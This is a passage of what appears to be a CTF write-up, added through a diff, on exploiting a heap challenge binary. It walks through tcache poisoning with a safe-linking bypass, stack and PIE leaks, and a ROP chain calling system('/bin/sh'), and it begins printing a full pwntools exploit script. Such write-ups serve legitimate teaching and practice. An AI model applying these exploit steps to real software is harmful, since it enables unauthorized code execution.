+</span></span><span class="line"><span class="cl"><span class="n">leak_stack</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak_stack</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rbp_addr</span> <span class="o">=</span> <span class="n">leak_stack</span> <span class="o">-</span> <span class="mh">0x138</span>
+</span></span></code></pre></div><p><strong>Technical Details:</strong></p>
+<ol>
+<li><strong>Environ Variable</strong>: Global pointer to environment variables on stack</li>
+<li><strong>Tcache Poisoning</strong>: Overwrite fd pointer to redirect allocation</li>
+<li><strong>Safe Linking Bypass</strong>: Use heap base to calculate proper XOR key</li>
+<li><strong>Stack Layout</strong>: environ points to stack, calculate return address offset</li>
+</ol>
+<p><strong>Tcache Manipulation:</strong></p>
+<pre tabindex="0"><code>Original: chunk_D -&gt; chunk_X
+Modified: chunk_D -&gt; (environ ^ key)
+Result:   malloc() returns environ address
+</code></pre>
+
+<h3 class="relative group">Stage 4: PIE Base Address Leak 
+    <div id="stage-4-pie-base-address-leak" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-4-pie-base-address-leak" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Calculate code base address to locate ptr_table</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit information leak in write function</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;write 15&#39;</span><span class="p">)</span>  <span class="c1"># Invalid index</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_elf</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_elf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak_elf</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Calculate PIE base</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_elf</span> <span class="o">-</span> <span class="mh">0x4150</span>
+</span></span></code></pre></div><p><strong>Technical Details:</strong></p>
+<ol>
+<li><strong>Information Leak</strong>: Write function leaks ptr_table address in error message</li>
+<li><strong>PIE Calculation</strong>: ptr_table has fixed offset from binary base</li>
+<li><strong>Address Validation</strong>: Verify leak by checking known binary structure</li>
+</ol>
+
+
+<h3 class="relative group">Stage 5: ROP Chain Construction 
+    <div id="stage-5-rop-chain-construction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-5-rop-chain-construction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Build ROP chain for shell execution</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Allocate chunks for stack manipulation</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_H</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_I</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create tcache chain for stack write</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_H</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_I</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Redirect to stack location</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">rbp_addr</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_I</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_J</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_K</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>  <span class="c1"># Points to stack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Build ROP chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1d84ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x119e9c</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x5c110</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000028882</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rop_chain</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_K</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">rop_chain</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong>ROP Chain Analysis:</strong></p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">pop rdi; ret    # Load /bin/sh address into rdi
+&lt;address of /bin/sh&gt;
+ret             # Stack alignment for system call
+system          # Execute system(&#34;/bin/sh&#34;)
+</code></pre>
+
+<h3 class="relative group">Stage 6: Memory Cleanup 
+    <div id="stage-6-memory-cleanup" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-6-memory-cleanup" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Clear ptr_table to avoid double-free crashes</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Allocate large chunks for ptr_table access</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_L</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_M</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_N</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>  <span class="c1"># Guard chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create tcache chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_L</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Redirect to ptr_table</span>
+</span></span><span class="line"><span class="cl"><span class="n">ptr_table</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4060</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">ptr_table</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_M</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Allocate to get ptr_table access</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_N</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_O</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>  <span class="c1"># Points to ptr_table</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Clear ptr_table to avoid double-free in exit handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">32</span>  <span class="c1"># Clear all 16 entries (8 bytes each)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_O</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong>Technical Details:</strong></p>
+<ol>
+<li><strong>Guard Chunk</strong>: Prevents consolidation with top chunk</li>
+<li><strong>Large Size</strong>: 0x200 bytes needed to clear entire ptr_table</li>
+<li><strong>Double-Free Prevention</strong>: Nullified pointers prevent exit handler crashes</li>
+<li><strong>Clean Exit</strong>: Program exits normally, executing our ROP chain</li>
+</ol>
+<hr>
+
+
+<h2 class="relative group">🎓 Advanced Concepts Explained 
+    <div id="-advanced-concepts-explained" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-advanced-concepts-explained" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Safe Linking Deep Dive 
+    <div id="safe-linking-deep-dive" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#safe-linking-deep-dive" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Implementation Details:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// In glibc source (malloc.c)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define PROTECT_PTR(pos, ptr) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</span></span></span></code></pre></div><p><strong>Mathematical Explanation:</strong></p>
+<ul>
+<li>Key = <code>chunk_address &gt;&gt; 12</code> (right shift by 12 bits)</li>
+<li>Protected = <code>real_pointer ^ key</code></li>
+<li>Recovery = <code>protected_pointer ^ key</code></li>
+</ul>
+<p><strong>Why Shift by 12?</strong></p>
+<ul>
+<li>Page boundary alignment (4KB pages)</li>
+<li>Reduces key space while maintaining security</li>
+<li>Balances performance vs security</li>
+</ul>
+
+
+<h3 class="relative group">Tcache vs Fastbin Differences 
+    <div id="tcache-vs-fastbin-differences" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#tcache-vs-fastbin-differences" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Tcache</th>
+<th>Fastbin</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Size Limit</td>
+<td>≤ 1024 bytes</td>
+<td>≤ 128 bytes</td>
+</tr>
+<tr>
+<td>Per-thread</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Security Checks</td>
+<td>Minimal</td>
+<td>More extensive</td>
+</tr>
+<tr>
+<td>Double-free Protection</td>
+<td>Basic</td>
+<td>Advanced</td>
+</tr>
+<tr>
+<td>Safe Linking</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+
+
+<h3 class="relative group">ASLR and PIE Interaction 
+    <div id="aslr-and-pie-interaction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#aslr-and-pie-interaction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>ASLR (Address Space Layout Randomization):</strong></p>
+<ul>
+<li>Randomizes memory layout at process startup</li>
+<li>Affects stack, heap, libraries, and executable (if PIE)</li>
+</ul>
+<p><strong>PIE (Position Independent Executable):</strong></p>
+<ul>
+<li>Makes executable code relocatable</li>
+<li>Combined with ASLR, randomizes code location</li>
+<li>Requires code address leaks for exploitation</li>
+</ul>
+<p><strong>Bypass Strategies:</strong></p>
+<ol>
+<li>Information leaks (format string, buffer over-read)</li>
+<li>Partial overwrite attacks (when randomization is limited)</li>
+<li>Brute force (for limited entropy scenarios)</li>
+</ol>
+
+
+<h3 class="relative group">ROP Chain Design Principles 
+    <div id="rop-chain-design-principles" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#rop-chain-design-principles" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Stack Alignment:</strong></p>
+<ul>
+<li>x64 ABI requires 16-byte stack alignment before function calls</li>
+<li>Add <code>ret</code> gadget for alignment if needed</li>
+</ul>
+<p><strong>Gadget Selection:</strong></p>
+<ul>
+<li>Prefer gadgets from libc (larger gadget space)</li>
+<li>Avoid gadgets with side effects</li>
+<li>Chain gadgets for complex operations</li>
+</ul>
+<p><strong>Payload Structure:</strong></p>
+<pre tabindex="0"><code>[padding] [gadget1] [arg1] [gadget2] [arg2] ... [final_function]
+</code></pre><hr>
+
+
+<h2 class="relative group">💻 Code Analysis 
+    <div id="-code-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-code-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Complete Exploit Script Analysis 
+    <div id="complete-exploit-script-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#complete-exploit-script-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./heapx_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gs</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">init-pwndbg&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="cl">    <span class="n">counter</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;new </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;read </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;write </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;data:&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;delete </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_D</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_C</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak2</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak2</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;key: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># =+=+--+=+= LEAKING HEAP AND LIBC BASE +=+=+--+=+=</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">leak</span><span class="o">^</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x12b0</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_C</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak3</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak3</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak3</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;leak3: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak3</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak3</span> <span class="o">-</span> <span class="mh">0x210b20</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># =+=+--+=+= LEAKING STACK ADDRESS +=+=+--+=+=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunk_E</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
